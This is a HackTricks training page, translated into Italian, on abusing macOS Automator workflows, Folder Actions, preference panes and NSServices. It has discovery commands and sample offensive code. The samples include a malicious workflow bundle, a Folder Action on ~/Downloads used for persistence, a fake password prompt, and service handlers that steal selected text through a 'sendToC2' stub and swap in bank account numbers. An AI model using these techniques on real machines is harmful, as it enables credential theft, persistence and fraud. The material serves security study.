# macOS Automator, Preference Panes & NSServices Abuso

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** è lo strumento di automazione visuale di macOS. Esegue **workflows** (`.workflow` bundles) composti da **actions** (`.action` bundles). Automator supporta anche **Folder Actions**, **Quick Actions**, e l'integrazione con **Shortcuts**.

Automator actions sono **plugins** caricati nel runtime di Automator quando un workflow viene eseguito. Possono:
- Eseguire script shell arbitrari
- Processare file e dati
- Interagire con applicazioni tramite AppleScript
- Collegiarsi in catene per automazioni complesse

### Why This Matters

> [!WARNING]
> Automator workflows can be **social-engineered** into execution — they appear as simple document files. A `.workflow` bundle can contain embedded shell commands that execute when the workflow runs. Combined with Folder Actions, they provide **automatic persistence** that triggers on file events.

### Scoperta
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Un bundle `.workflow` appare come un normale documento per la maggior parte degli utenti:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attacco: Folder Action Persistence

Folder Actions eseguono automaticamente un workflow quando vengono aggiunti file a una cartella monitorata:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistono attraverso i riavvii ed eseguono silenziosamente. Una Folder Action su `~/Downloads` significa che **ogni file scaricato attiva il tuo payload** — inclusi file da Safari, Chrome, AirDrop e allegati email.

---

## Pannelli delle Preferenze

### Informazioni di base

Preference panes (`.prefPane` bundles) sono plugin caricati in **System Settings** (precedentemente System Preferences). Forniscono pannelli dell'interfaccia di configurazione per funzionalità di sistema o di terze parti.

### Perché questo è importante

- I preference panes vengono eseguiti all'interno del **System Settings process**, che potrebbe avere **elevated TCC permissions** (accessibility, full disk access in alcuni contesti)
- I preference panes di terze parti vengono caricati in questo processo attendibile, **ereditando il suo contesto di sicurezza**
- Gli utenti installano i preference panes con un **doppio clic** — facile social engineering
- Una volta installati, **persistono** e vengono caricati ogni volta che System Settings si apre su quel pannello

### Scoperta
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attacco: Privilege Context Hijacking

Un preference pane malevolo eredita il contesto di sicurezza di System Settings:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attacco: Persistenza tramite Installazione
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Un pannello delle Preferenze può imitare i pannelli dell'interfaccia di sistema legittimi per **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informazioni di base

**NSServices** permettono alle applicazioni di fornire funzionalità ad altre app tramite il **menu Servizi** (clic destro → Servizi). Quando un utente seleziona testo o dati e invoca un servizio, i dati selezionati vengono **inviati al provider del servizio** per l'elaborazione.

I servizi vengono dichiarati nel `Info.plist` di un'applicazione sotto la chiave `NSServices` e registrati con il server del pasteboard (`pbs`).

### Perché è importante

- I servizi ricevono un **flusso di dati tra applicazioni** — il testo selezionato da qualsiasi applicazione viene inviato al servizio
- Un servizio malevolo acquisisce dati da gestori di password, client di posta e app finanziarie
- I servizi possono **restituire dati modificati** all'applicazione chiamante (man-in-the-middle sulle operazioni di selezione)
- I nomi dei servizi possono essere creati per sembrare legittimi ("Format Text", "Encrypt Selection", "Share")

### Scoperta
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attacco: Servizio di intercettazione dati
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attacco: Modifica dei dati (Man-in-the-Middle)

Un servizio può **modificare i dati restituiti** mentre sembra fornire una funzione legittima:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Catene di attacco tra tecniche

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Pannello Preferenze → Escalation TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Furto del gestore di password
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Riferimenti

* [Apple Developer — Guida alla programmazione di Automator](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Guida alla programmazione dei pannelli Preferenze](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Guida all'implementazione dei Services](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Persistenza delle Folder Action](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
